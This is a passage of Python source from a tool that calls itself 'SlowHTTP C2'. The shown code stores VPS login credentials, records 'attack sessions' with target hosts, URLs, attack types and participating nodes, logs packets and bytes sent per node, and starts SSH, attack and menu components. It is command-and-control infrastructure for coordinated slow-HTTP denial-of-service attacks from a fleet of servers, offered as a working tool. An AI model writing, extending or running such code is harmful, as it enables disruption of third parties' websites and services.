    def update_vps(self, vps_id, name=None, ip_address=None, username=None, password=None, ssh_port=None):
        """Update VPS information"""
        # Get current VPS data
        vps = self.get_vps(vps_id)
        if not vps:
            raise ValueError(f"VPS with ID {vps_id} not found")
        
        # Prepare update data
        update_data = {}
        if name is not None:
            update_data['name'] = name
        if ip_address is not None:
            if not self.security.validate_ip_address(ip_address):
                raise ValueError("Invalid IP address format")
            update_data['ip_address'] = ip_address
        if username is not None:
            update_data['username'] = username
        if password is not None:
            update_data['password'] = self.security.encrypt_password(password)
        if ssh_port is not None:
            if not self.security.validate_port(ssh_port):
                raise ValueError("Invalid SSH port")
            update_data['ssh_port'] = ssh_port
        
        if not update_data:
            return False  # Nothing to update
        
        # Build query
        query_parts = []
        params = []
        
        for key, value in update_data.items():
            query_parts.append(f"{key} = ?")
            params.append(value)
        
        query = f"UPDATE vps SET {', '.join(query_parts)} WHERE id = ?"
        params.append(vps_id)
        
        self.execute_query(query, params)
        return True
    
    def delete_vps(self, vps_id):
        """Delete a VPS from the database"""
        query = "DELETE FROM vps WHERE id = ?"
        self.execute_query(query, (vps_id,))
        return True
    
    def get_vps(self, vps_id):
        """Get VPS information by ID"""
        query = "SELECT * FROM vps WHERE id = ?"
        result = self.execute_query(query, (vps_id,), fetch_one=True)
        
        if result:
            # Convert to dict and decrypt password
            vps_dict = dict(result)
            vps_dict['password'] = self.security.decrypt_password(vps_dict['password'])
            return vps_dict
        
        return None
    
    def get_vps_by_ip(self, ip_address):
        """Get VPS information by IP address"""
        query = "SELECT * FROM vps WHERE ip_address = ?"
        result = self.execute_query(query, (ip_address,), fetch_one=True)
        
        if result:
            # Convert to dict and decrypt password
            vps_dict = dict(result)
            vps_dict['password'] = self.security.decrypt_password(vps_dict['password'])
            return vps_dict
        
        return None
    
    def get_all_vps(self):
        """Get all VPS records"""
        query = "SELECT * FROM vps ORDER BY name"
        results = self.execute_query(query, fetch_all=True)
        
        vps_list = []
        for result in results:
            vps_dict = dict(result)
            vps_dict['password'] = self.security.decrypt_password(vps_dict['password'])
            vps_list.append(vps_dict)
        
        return vps_list
    
    def update_vps_status(self, ip_address, status):
        """Update VPS status and last_seen timestamp"""
        query = "UPDATE vps SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE ip_address = ?"
        self.execute_query(query, (status, ip_address))
        return True
    
    def create_attack_session(self, session_name, target_host, target_url, attack_type, vps_nodes, parameters):
        """Create a new attack session"""
        query = '''
        INSERT INTO attack_sessions 
        (session_name, target_host, target_url, attack_type, vps_nodes, status, start_time, parameters)
        VALUES (?, ?, ?, ?, ?, 'created', CURRENT_TIMESTAMP, ?)
        '''
        
        # Convert parameters to JSON string
        params_json = json.dumps(parameters)
        
        # Convert VPS nodes list to comma-separated string if it's a list
        if isinstance(vps_nodes, list):
            vps_nodes = ','.join(vps_nodes)
        
        return self.execute_query(query, (session_name, target_host, target_url, attack_type, vps_nodes, params_json))
    
    def update_attack_status(self, session_id, status, error_details=None):
        """Update attack session status"""
        if status == 'running':
            query = "UPDATE attack_sessions SET status = ?, start_time = CURRENT_TIMESTAMP WHERE id = ?"
            self.execute_query(query, (status, session_id))
        elif status in ['completed', 'stopped', 'failed']:
            query = "UPDATE attack_sessions SET status = ?, end_time = CURRENT_TIMESTAMP, error_details = ? WHERE id = ?"
            self.execute_query(query, (status, error_details, session_id))
        else:
            query = "UPDATE attack_sessions SET status = ? WHERE id = ?"
            self.execute_query(query, (status, session_id))
        
        return True
    
    def get_attack_session(self, session_id):
        """Get attack session information"""
        query = "SELECT * FROM attack_sessions WHERE id = ?"
        result = self.execute_query(query, (session_id,), fetch_one=True)
        
        if result:
            session_dict = dict(result)
            
            # Parse parameters JSON
            if session_dict['parameters']:
                try:
                    session_dict['parameters'] = json.loads(session_dict['parameters'])
                except:
                    session_dict['parameters'] = {}
            else:
                session_dict['parameters'] = {}
            
            return session_dict
        
        return None
    
    def get_all_attack_sessions(self, limit=100, status=None):
        """Get all attack sessions with optional filtering"""
        if status:
            query = "SELECT * FROM attack_sessions WHERE status = ? ORDER BY id DESC LIMIT ?"
            results = self.execute_query(query, (status, limit), fetch_all=True)
        else:
            query = "SELECT * FROM attack_sessions ORDER BY id DESC LIMIT ?"
            results = self.execute_query(query, (limit,), fetch_all=True)
        
        sessions = []
        for result in results:
            session_dict = dict(result)
            
            # Parse parameters JSON
            if session_dict['parameters']:
                try:
                    session_dict['parameters'] = json.loads(session_dict['parameters'])
                except:
                    session_dict['parameters'] = {}
            else:
                session_dict['parameters'] = {}
            
            sessions.append(session_dict)
        
        return sessions
    
    def add_attack_result(self, session_id, vps_ip, connections_active, packets_sent, bytes_sent, 
                         error_count, cpu_usage, memory_usage, response_codes, status):
        """Add attack result data"""
        query = '''
        INSERT INTO attack_results 
        (session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, 
         cpu_usage, memory_usage, response_codes, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        '''
        
        self.execute_query(query, (
            session_id, vps_ip, connections_active, packets_sent, bytes_sent, 
            error_count, cpu_usage, memory_usage, response_codes, status
        ))
        
        return True
    
    def get_attack_results(self, session_id, limit=100):
        """Get attack results for a session"""
        query = '''
        SELECT * FROM attack_results 
        WHERE session_id = ? 
        ORDER BY timestamp DESC 
        LIMIT ?
        '''
        
        results = self.execute_query(query, (session_id, limit), fetch_all=True)
        
        return [dict(result) for result in results]
    
    def get_setting(self, key, default=None):
        """Get a setting value"""
        query = "SELECT value FROM settings WHERE key = ?"
        result = self.execute_query(query, (key,), fetch_one=True)
        
        if result:
            return result['value']
        
        return default
    
    def set_setting(self, key, value):
        """Set a setting value"""
        query = '''
        INSERT INTO settings (key, value, updated_at) 
        VALUES (?, ?, CURRENT_TIMESTAMP)
        ON CONFLICT(key) DO UPDATE SET value = ?, updated_at = CURRENT_TIMESTAMP
        '''
        
        self.execute_query(query, (key, value, value))
        return True
    
    def add_log(self, level, message, source="system"):
        """Add a log entry to the database"""
        query = "INSERT INTO logs (level, message, source) VALUES (?, ?, ?)"
        self.execute_query(query, (level, message, source))
        return True
    
    def get_logs(self, limit=100, level=None, source=None):
        """Get log entries with optional filtering"""
        params = []
        conditions = []
        
        if level:
            conditions.append("level = ?")
            params.append(level)
        
        if source:
            conditions.append("source = ?")
            params.append(source)
        
        where_clause = " WHERE " + " AND ".join(conditions) if conditions else ""
        
        query = f"SELECT * FROM logs{where_clause} ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)
        
        results = self.execute_query(query, params, fetch_all=True)
        return [dict(result) for result in results]
    
    def close(self):
        """Close the database connection"""
        with self.lock:
            if self.conn:
                try:
                    self.conn.close()
                except:
                    pass
                self.conn = None

def main():
    """Main function to initialize and run the application"""
    try:
        # Print startup message
        print(f"Starting SlowHTTP C2 v{VERSION}...")
        print("Initializing components...")
        
        # Initialize components
        security_manager = SecurityManager()
        print("Security manager initialized.")
        
        db_manager = DatabaseManager("slowhttp_c2.db")
        print("Database manager initialized.")
        
        ssh_manager = SSHManager(db_manager)
        print("SSH manager initialized.")
        
        network_tools = NetworkTools()
        print("Network tools initialized.")
        
        attack_manager = AttackManager(db_manager, ssh_manager)
        print("Attack manager initialized.")
        
        # Create logs directory if it doesn't exist
        os.makedirs("logs", exist_ok=True)
        
        # Load settings
        connection_timeout = db_manager.get_setting('connection_timeout')
        if connection_timeout:
            ssh_manager.connection_timeout = int(connection_timeout)
        
        command_timeout = db_manager.get_setting('command_timeout')
        if command_timeout:
            ssh_manager.command_timeout = int(command_timeout)
        
        # Initialize TUI
        tui = SlowHTTPTUI(db_manager, ssh_manager, attack_manager, network_tools)
        
        # Run main menu
        tui.main_menu()
        
        # Clean up
        print("Cleaning up...")
        ssh_manager.disconnect_all()
        db_manager.close()
        print("Done.")
        
    except KeyboardInterrupt:
        print("\nProgram interrupted by user. Exiting...")
        try:
            ssh_manager.disconnect_all()
            db_manager.close()
        except:
            pass
    except Exception as e:
        print(f"Error: {str(e)}")
        logger.error(f"Fatal error: {str(e)}")
        logger.error(traceback.format_exc())
        
        try:
            ssh_manager.disconnect_all()
            db_manager.close()
        except:
            pass

if __name__ == "__main__":
    main()
